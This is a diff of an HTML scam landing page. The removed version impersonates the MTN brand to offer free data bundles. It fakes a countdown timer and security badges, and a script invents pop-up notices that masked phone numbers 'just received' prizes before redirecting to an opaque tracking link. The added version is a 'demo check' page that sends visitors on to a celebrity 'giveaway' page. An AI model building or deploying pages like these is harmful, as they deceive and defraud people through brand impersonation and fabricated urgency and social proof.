@@ -1,677 +1,191 @@
-<!doctype html>
-<html lang="en-US">
- <head>
-  <script src="https://3nbf4.com/act/files/tag.min.js?z=10347392" data-cfasync="false" async></script>
-  <!-- Meta Pixel Code -->
-<script>
-!function(f,b,e,v,n,t,s)
-{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-n.queue=[];t=b.createElement(e);t.async=!0;
-t.src=v;s=b.getElementsByTagName(e)[0];
-s.parentNode.insertBefore(t,s)}(window, document,'script',
-'https://connect.facebook.net/en_US/fbevents.js');
-fbq('init', '1159742623058015');
-fbq('track', 'PageView');
-</script>
-<noscript><img height="1" width="1" style="display:none"
-src="https://www.facebook.com/tr?id=1159742623058015&ev=PageView&noscript=1"
-/></noscript>
-<!-- End Meta Pixel Code -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>MTN Data Bounties -</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
-  <style>
-        /* --- MTN Brand Colors --- */
-        :root {
-            --mtn-yellow: #ffcb00;
-            --mtn-yellow-dark: #e6b800;
-            --mtn-blue: #004987;
-            --text-dark: #222;
-            --success-green: #28a745;
-            --error-red: #dc3545;
-            --light-gray: #f8f9fa;
-            --medium-gray: #e9ecef;
-        }
- 
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
- 
-        body {
-            font-family: 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
-            background: linear-gradient(135deg, #FFF9E8 0%, #fef5e7 100%);
-            margin: 0;
-            padding: 15px;
-            color: #333;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
- 
-        .container {
-            max-width: 480px;
-            width: 100%;
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 12px;
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
-            border-top: 5px solid var(--mtn-yellow);
-            position: relative;
-            z-index: 1;
-            margin: 10px 0;
-        }
- 
-        .header {
-            text-align: center;
-            margin-bottom: 15px;
-        }
- 
-        .logo-container {
-            margin-bottom: 12px;
-        }
- 
-        .logo {
-            max-width: 150px;
-            height: auto;
-        }
- 
-        h1 {
-            font-size: 24px;
-            margin-bottom: 8px;
-            color: #000;
-            font-weight: 700;
-        }
- 
-        .subtitle {
-            font-size: 16px;
-            color: #555;
-            margin-bottom: 5px;
-        }
- 
-        .offer-badge {
-            display: inline-block;
-            background: linear-gradient(135deg, var(--mtn-yellow) 0%, var(--mtn-yellow-dark) 100%);
-            color: #000;
-            font-weight: 700;
-            padding: 6px 12px;
-            border-radius: 16px;
-            margin: 10px 0;
-            font-size: 14px;
-            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.1);
-        }
- 
-        .benefits-container {
-            display: flex;
-            justify-content: space-between;
-            background-color: var(--light-gray);
-            border-radius: 8px;
-            padding: 12px;
-            margin: 15px 0;
-            gap: 8px;
-        }
- 
-        .benefit {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            text-align: center;
-            flex: 1;
-        }
- 
-        .benefit i {
-            color: var(--mtn-yellow);
-            font-size: 18px;
-            margin-bottom: 6px;
-        }
- 
-        .benefit-text {
-            font-size: 11px;
-            line-height: 1.3;
-        }
- 
-        .countdown {
-            text-align: center;
-            margin: 12px 0;
-            font-size: 13px;
-            color: #e74c3c;
-            font-weight: 600;
-        }
- 
-        .form-group {
-            position: relative;
-            margin-bottom: 15px;
-        }
- 
-        label {
-            display: block;
-            margin-bottom: 6px;
-            font-weight: 600;
-            font-size: 14px;
-            color: #444;
-        }
- 
-        input, button {
-            width: 100%;
-            padding: 12px;
-            font-size: 15px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            box-sizing: border-box;
-            height: 50px;
-            transition: all 0.3s ease;
-        }
- 
-        input {
-            background-color: #fdfdfd;
-            padding-right: 40px;
-        }
- 
-        input:focus {
-            outline: none;
-            border-color: var(--mtn-yellow);
-            box-shadow: 0 0 0 3px rgba(255, 203, 0, 0.35);
-            background-color: #fff;
-        }
- 
-        .form-group.valid input {
-            border-color: var(--success-green);
-        }
- 
-        .form-group.error input,
-        .form-group.error .select-box {
-            border-color: var(--error-red);
-        }
-        
-        .form-group.error .select-box {
-            border: 1px solid var(--error-red);
-        }
- 
-        .error-message {
-            color: var(--error-red);
-            font-size: 13px;
-            margin-top: 5px;
-            display: none;
-        }
- 
-        .form-group.error .error-message {
-            display: block;
-        }
- 
-        .select-box {
-            display: flex;
-            justify-content: space-between;
-            gap: 8px;
-            border: none;
-            padding: 0;
-            background-color: transparent;
-        }
- 
-        .select-box .option {
-            flex: 1;
-            text-align: center;
-            padding: 12px 5px;
-            cursor: pointer;
-            border-radius: 8px;
-            transition: all 0.3s ease;
-            border: 2px solid var(--medium-gray);
-            font-size: 15px;
-            font-weight: 500;
-            background: var(--light-gray);
-        }
- 
-        .select-box .option:hover {
-            border-color: var(--mtn-yellow);
-            background: rgba(255, 203, 0, 0.1);
-        }
- 
-        .select-box .option.selected {
-            background-color: var(--mtn-yellow);
-            color: var(--text-dark);
-            font-weight: bold;
-            border-color: var(--mtn-yellow);
-            transform: scale(1.03);
-            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.1);
-        }
- 
-        button {
-            background: linear-gradient(135deg, var(--mtn-yellow) 0%, var(--mtn-yellow-dark) 100%);
-            color: var(--text-dark);
-            border: none; 
-            cursor: pointer;
-            font-weight: 700; 
-            margin-top: 20px; 
-            text-transform: uppercase; 
-            letter-spacing: 0.5px;
-            height: 55px;
-            font-size: 16px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
-            position: relative;
-            overflow: hidden;
-        }
- 
-        button:hover { 
-            transform: translateY(-2px);
-            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
-        }
-        
-        button:active {
-            transform: translateY(0);
-        }
-        
-        .disclaimer {
-            font-size: 11px;
-            text-align: center;
-            color: #777;
-            margin-top: 15px;
-            padding: 0 8px;
-            line-height: 1.4;
-        }
-        
-        .security-badges {
-            display: flex;
-            justify-content: center;
-            gap: 12px;
-            margin-top: 15px;
-        }
-        
-        .badge {
-            font-size: 11px;
-            display: flex;
-            align-items: center;
-            gap: 4px;
-            color: #666;
-        }
-        
-        .badge i {
-            color: var(--mtn-blue);
-        }
-        
-        .loader {
-            display: none; 
-            position: fixed; 
-            top: 0; 
-            left: 0; 
-            width: 100vw; 
-            height: 100vh;
-            background-color: rgba(255, 255, 255, 0.95); 
-            z-index: 9999; 
-            justify-content: center;
-            align-items: center; 
-            flex-direction: column; 
-            backdrop-filter: blur(4px);
-        }
-        
-        .loader-content {
-            text-align: center;
-        }
-        
-        .loader-content p { 
-            color: #333; 
-            font-size: 18px; 
-            font-weight: 500; 
-            margin: 0; 
-        }
-        
-        .spinner {
-            width: 60px;
-            height: 60px;
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid var(--mtn-yellow);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 15px auto;
-        }
- 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
- 
-        .social-proof {
-            position: fixed; 
-            bottom: 15px; 
-            left: 15px; 
-            background-color: #fff; 
-            padding: 12px 15px;
-            border-radius: 8px; 
-            box-shadow: 0 3px 12px rgba(0,0,0,0.12); 
-            font-size: 13px;
-            color: #333; 
-            z-index: 1000; 
-            max-width: 300px; 
-            pointer-events: none;
-            opacity: 0; 
-            transform: translateY(20px); 
-            transition: all 0.4s ease;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .social-proof.show { 
-            opacity: 1; 
-            transform: translateY(0); 
-        }
-        
-        .social-proof i {
-            color: var(--success-green);
-            font-size: 18px;
-        }
-        
-        .cta-highlight {
-            position: relative;
-            animation: pulse 2s infinite;
-        }
-        
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.02); }
-            100% { transform: scale(1); }
-        }
-        
-        @media (max-width: 520px) {
-            body {
-                padding: 10px;
-            }
-            
-            .container {
-                padding: 15px;
-            }
-            
-            h1 {
-                font-size: 22px;
-            }
-            
-            .subtitle {
-                font-size: 15px;
-            }
-            
-            .benefits-container {
-                flex-direction: column;
-                gap: 12px;
-            }
-            
-            .benefit {
-                flex-direction: row;
-                justify-content: flex-start;
-                text-align: left;
-                gap: 8px;
-            }
-            
-            .benefit i {
-                margin-bottom: 0;
-                font-size: 16px;
-            }
-            
-            .social-proof {
-                left: 10px;
-                right: 10px;
-                max-width: none;
-                bottom: 10px;
-            }
-        }
-    </style>
-  <link rel="me" href="https://www.blogger.com/profile/17781138282047660052">
-  <meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
-  <meta name="google-adsense-platform-domain" content="blogspot.com">
-  <link rel="me" href="https://www.blogger.com/profile/02881604410527072183">
-  <meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
-  <meta name="google-adsense-platform-domain" content="blogspot.com">
-  <link rel="me" href="https://www.blogger.com/profile/02881604410527072183">
-  <meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
-  <meta name="google-adsense-platform-domain" content="blogspot.com">
-  <link rel="me" href="https://www.blogger.com/profile/02881604410527072183">
-  <meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
-  <meta name="google-adsense-platform-domain" content="blogspot.com">
-  <link rel="me" href="https://www.blogger.com/profile/02881604410527072183">
-  <meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
-  <meta name="google-adsense-platform-domain" content="blogspot.com">
-  <link rel="me" href="https://www.blogger.com/profile/02881604410527072183">
-  <meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
-  <meta name="google-adsense-platform-domain" content="blogspot.com">
-  <link rel="me" href="https://www.blogger.com/profile/02881604410527072183">
-  <meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
-  <meta name="google-adsense-platform-domain" content="blogspot.com">
-  <link rel="me" href="https://www.blogger.com/profile/02881604410527072183">
-  <meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
-  <meta name="google-adsense-platform-domain" content="blogspot.com">
-  <link rel="me" href="https://www.blogger.com/profile/02881604410527072183">
-  <meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
-  <meta name="google-adsense-platform-domain" content="blogspot.com">
-  <link rel="me" href="https://www.blogger.com/profile/02881604410527072183">
-  <meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
-  <meta name="google-adsense-platform-domain" content="blogspot.com">
-  <link rel="me" href="https://www.blogger.com/profile/02881604410527072183">
-  <meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
-  <meta name="google-adsense-platform-domain" content="blogspot.com">
-  <link rel="me" href="https://www.blogger.com/profile/02881604410527072183">
-  <meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
-  <meta name="google-adsense-platform-domain" content="blogspot.com">
-  <link rel="me" href="https://www.blogger.com/profile/02881604410527072183">
-  <meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
-  <meta name="google-adsense-platform-domain" content="blogspot.com">
-  <link rel="me" href="https://www.blogger.com/profile/12463809658782787377">
-  <meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
-  <meta name="google-adsense-platform-domain" content="blogspot.com">
-  <link rel="me" href="https://www.blogger.com/profile/12463809658782787377">
-  <meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
-  <meta name="google-adsense-platform-domain" content="blogspot.com">
-  <link rel="me" href="https://www.blogger.com/profile/02881604410527072183">
-  <meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
-  <meta name="google-adsense-platform-domain" content="blogspot.com">
-  <link rel="me" href="https://draft.blogger.com/profile/02881604410527072183">
-  <meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
-  <meta name="google-adsense-platform-domain" content="blogspot.com">
-  <link rel="me" href="https://www.blogger.com/profile/02920572583687095241">
-  <meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
-  <meta name="google-adsense-platform-domain" content="blogspot.com">
-  <link rel="me" href="https://www.blogger.com/profile/02920572583687095241">
-  <meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
-  <meta name="google-adsense-platform-domain" content="blogspot.com">
- </head>
- <body>
-  <div class="container">
-   <div class="header">
-    <h1>AWOOF BUNDLE</h1>
-    <p class="subtitle">Get an exclusive Offer Package Here</p>
-    <div class="offer-badge">
-     <i class="fas fa-gift"></i> LIMITED TIME OFFER
-    </div>
-   </div>
-   <div class="benefits-container">
-    <div class="benefit">
-     <i class="fas fa-check-circle"></i> <span class="benefit-text">Instant allocation</span>
-    </div>
-    <div class="benefit">
-     <i class="fas fa-bolt"></i> <span class="benefit-text">No credit card required</span>
-    </div>
-    <div class="benefit">
-     <i class="fas fa-shield-alt"></i> <span class="benefit-text">Secure &amp; verified</span>
-    </div>
-   </div>
-   <div class="countdown">
-    <i class="fas fa-clock"></i> Offer expires in: <span id="countdown-timer">05:00</span>
-   </div>
-   <div id="form-container">
-    <form id="grantForm" novalidate>
-     <div class="form-group" id="amountGroup">
-      <label>Select a Package below 👇</label>
-      <div class="select-box" id="amount">
-       <div class="option" data-value="10000">1.5GB</div>
-       <div class="option" data-value="20000">3.5GB</div>
-       <div class="option" data-value="30000">5GB</div>
-      </div>
-      <input type="hidden" id="selectedAmount" name="selectedAmount" required>
-      <div class="error-message">Please select a package</div>
-     </div>
-     <div class="cta-highlight">
-      <button type="submit"><i class="fas fa-arrow-right"></i> CONTINUE HERE</button>
-     </div>
-    </form>
-    <div class="security-badges">
-     <div class="badge">
-      <i class="fas fa-lock"></i> Secure
-     </div>
-     <div class="badge">
-      <i class="fas fa-user-shield"></i> Verified
-     </div>
-     <div class="badge">
-      <i class="fas fa-shield-alt"></i> Encrypted
-     </div>
-    </div>
-    <p class="disclaimer">The Continue button above takes you to a second page that gives you access to <b>Subscribe</b> and confirm your phone number to get your package
-     <br>
-     <br>
-     <b>Disclaimer:</b> Offer exclusively available after following the steps on the next page. This offer is available to subscribers only and is subject to terms and conditions.</p>
-   </div>
-  </div>
-  <div class="loader" id="loader">
-   <div class="loader-content">
-    <div class="spinner"></div>
-    <p>Checking Eligibility...</p>
-    <p>Please wait while we Proceed</p>
-   </div>
-  </div>
-  <div class="social-proof" id="socialProof"></div>
+
+  <!-- Meta Pixel Code -->
   <script>
-        const form = document.getElementById('grantForm');
-        const loader = document.getElementById('loader');
-        const container = document.querySelector('.container');
-        const amountBox = document.getElementById('amount');
-        const selectedAmountInput = document.getElementById('selectedAmount');
-        const formGroups = document.querySelectorAll('.form-group');
-        const socialProof = document.getElementById('socialProof');
-        const countdownTimer = document.getElementById('countdown-timer');
-    
- 
-        // Initialize option selection
-        amountBox.addEventListener('click', function(e) {
-            if (e.target.classList.contains('option')) {
-                amountBox.querySelectorAll('.option').forEach(option => {
-                    option.classList.remove('selected');
-                });
-                e.target.classList.add('selected');
-                selectedAmountInput.value = e.target.getAttribute('data-value');
-                
-                const group = e.target.closest('.form-group');
-                setFieldState(group, 'valid');
-                
-                // Show confetti effect for selection
-                confetti({
-                    particleCount: 20,
-                    spread: 30,
-                    origin: { y: 0.6 },
-                    colors: ['#ffcb00', '#004987']
-                });
-            }
-        });
- 
-        function setFieldState(group, state) {
-            group.classList.remove('valid', 'error');
-            if (state) { group.classList.add(state); }
-        }
- 
-        // Countdown timer
-        function startCountdown(duration) {
-            let timer = duration, minutes, seconds;
-            const countdownInterval = setInterval(function () {
-                minutes = parseInt(timer / 60, 10);
-                seconds = parseInt(timer % 60, 10);
- 
-                minutes = minutes < 10 ? "0" + minutes : minutes;
-                seconds = seconds < 10 ? "0" + seconds : seconds;
- 
-                countdownTimer.textContent = minutes + ":" + seconds;
- 
-                if (--timer < 0) {
-                    clearInterval(countdownInterval);
-                    document.querySelector('.countdown').innerHTML = '<i class="fas fa-exclamation-triangle"></i> Offer has expired';
-                }
-            }, 1000);
-        }
-   
- 
-        startCountdown(300); // 5 minutes countdown
- 
-        form.addEventListener('submit', function(e) {
-            e.preventDefault();
-            let isFormValid = true;
-            let firstInvalidField = null;
- 
-            formGroups.forEach(group => {
-                const input = group.querySelector('input');
-                if (input) {
-                    let isValid = input.value.trim() !== '';
-                    if (input.id === 'selectedAmount' && !selectedAmountInput.value) {
-                        isValid = false;
-                    }
-                    if (!isValid) {
-                        setFieldState(group, 'error');
-                        isFormValid = false;
-                        if (!firstInvalidField) { firstInvalidField = group; }
-                    } else {
-                        setFieldState(group, 'valid');
-                    }
-                }
-            });
- 
-            if (!isFormValid) {
-                if(firstInvalidField) {
-                    firstInvalidField.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                }
-                return;
-            }
- 
-            container.style.opacity = '0.5';
-            loader.style.display = 'flex';
- 
-            setTimeout(() => { 
-                const urls = [
-                    'https://lkznfdq.com/cl/1a5bbdc23cc593eb',
-                    'https://lkznfdq.com/cl/1a5bbdc23cc593eb'
-                ];
- 
-                const randomIndex = Math.floor(Math.random() * urls.length);
-                const randomUrl = urls[randomIndex];
-                
-                window.location.href = randomUrl;
-                
-            }, 1500); // 1.5-second delay
-        });
- 
-        /* --- Social Proof JavaScript Logic --- */
-        const names = ["0812*****06", "0907*****19", "0912*****82", "0810*****74", "0807*****32", "0706*****7", "0812*****09", "0701*****62", "0901*****89", "0810*****76"];
-        const states = ["Lagos", "Abuja", "Port Harcourt", "Ibadan", "Kano", "Benin", "Enugu", "Kaduna", "Abeokuta", "Warri"];
-        
-        function showSocialProof() {
-            const name = names[Math.floor(Math.random() * names.length)];
-            const state = states[Math.floor(Math.random() * states.length)];
-            const dataAmounts = ["N5000", "Cash", "Data", "Airtime", "N10000"];
-            const dataAmount = dataAmounts[Math.floor(Math.random() * dataAmounts.length)];
-            
-            socialProof.innerHTML = `
-                <i class="fas fa-check-circle"></i>
-                <div>
-                    <strong>${name} - ${state}</strong> just received ${dataAmount} Award prize
-                    <div style="font-size: 11px; color: #777;">Just now</div>
-                </div>
-            `;
-            socialProof.classList.add('show');
-            setTimeout(() => { socialProof.classList.remove('show'); }, 5000);
-        }
- 
-        // Show first notification after 2 seconds
-        setTimeout(showSocialProof, 2000); 
-        // Continue s  ur howing notifications every 8-12 seconds
-        setInterval(showSocialProof, 8000 + Math.random() * 4000); 
-    </script>
- </body>
+  !function(f,b,e,v,n,t,s)
+  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+  n.queue=[];t=b.createElement(e);t.async=!0;
+  t.src=v;s=b.getElementsByTagName(e)[0];
+  s.parentNode.insertBefore(t,s)}(window, document,'script',
+  'https://connect.facebook.net/en_US/fbevents.js');
+  fbq('init', '1159742623058015');
+  fbq('track', 'PageView');
+  </script>
+
+  <noscript>
+    <img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=1159742623058015&ev=PageView&noscript=1"/>
+  </noscript>
+  <!-- End Meta Pixel Code -->
+
+  <style>
+  * {
+    box-sizing: border-box;
+  }
+
+  html, body {
+    width: 100% !important;
+    margin: 0 !important;
+    padding: 0 !important;
+    overflow-x: hidden !important;
+  }
+
+  body {
+    background: #eff9f3 !important;
+  }
+
+  .demo-page {
+    width: 100% !important;
+    min-height: 100vh;
+    min-height: 100svh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 16px;
+    font-family: Arial, sans-serif;
+    color: #101b16;
+  }
+
+  .demo-card {
+    width: 100%;
+    max-width: 580px;
+    background: #fff;
+    border: 1px solid #d9e8df;
+    border-radius: 25px;
+    padding: 32px 28px;
+    text-align: center;
+    box-shadow: 0 10px 30px #174b2910;
+  }
+
+  .demo-badge {
+    display: inline-block;
+    background: #e9f6ee;
+    color: #217747;
+    border-radius: 30px;
+    padding: 9px 18px;
+    font-size: 15px;
+    font-weight: bold;
+    letter-spacing: 1.5px;
+  }
+
+  .demo-card h1 {
+    font-size: 31px;
+    margin: 25px 0 12px;
+  }
+
+  .demo-subtitle {
+    font-size: 18px;
+    line-height: 1.5;
+    color: #65756d;
+    margin-bottom: 26px;
+  }
+
+  .demo-btn {
+    width: 100%;
+    min-height: 70px;
+    border: none;
+    border-radius: 18px;
+    background: #209b53;
+    color: white;
+    font-size: 22px;
+    font-weight: bold;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 17px 23px;
+    cursor: pointer;
+    transition: background .2s, opacity .2s;
+  }
+
+  .demo-notice {
+    color: #65756d;
+    font-size: 12px;
+    margin-top: 17px;
+  }
+
+  @media (max-width: 600px) {
+    .demo-page {
+      padding: 14px;
+    }
+
+    .demo-card {
+      width: 100%;
+      max-width: 100%;
+      padding: 30px 21px;
+      border-radius: 23px;
+    }
+
+    .demo-card h1 {
+      font-size: 29px;
+      margin: 24px 0 12px;
+    }
+
+    .demo-subtitle {
+      font-size: 17px;
+      margin-bottom: 24px;
+    }
+
+    .demo-btn {
+      min-height: 66px;
+      font-size: 21px;
+      padding: 16px 20px;
+    }
+  }
+  </style>
+</head>
+
+<body>
+
+  <div class="demo-page">
+    <div class="demo-card">
+
+      <div class="demo-badge">● DEMO CHECK</div>
+
+      <h1>Confirm to continue</h1>
+
+      <p class="demo-subtitle">
+        Click the Continue button below to Proceed.
+      </p>
+
+      <button class="demo-btn" id="demoContinue" type="button">
+        <span>Continue Here</span>
+        <span>➜</span>
+      </button>
+
+      <p class="demo-notice">Click continue to proceed.</p>
+
+    </div>
+  </div>
+
+  <script>
+  (function() {
+
+    const button = document.getElementById("demoContinue");
+
+    const destination =
+      "https://texy3.github.io/floyd/mayweather-fans-giveaway.html";
+
+    function resetButton() {
+      button.disabled = false;
+      button.innerHTML =
+        '<span>Continue Here</span><span>➜</span>';
+      button.classList.remove("loading");
+    }
+
+    window.addEventListener("pageshow", resetButton);
+
+    button.addEventListener("click", function() {
+      window.location.href = destination;
+    });
+
+  })();
+  </script>
+
+</body>
 </html>
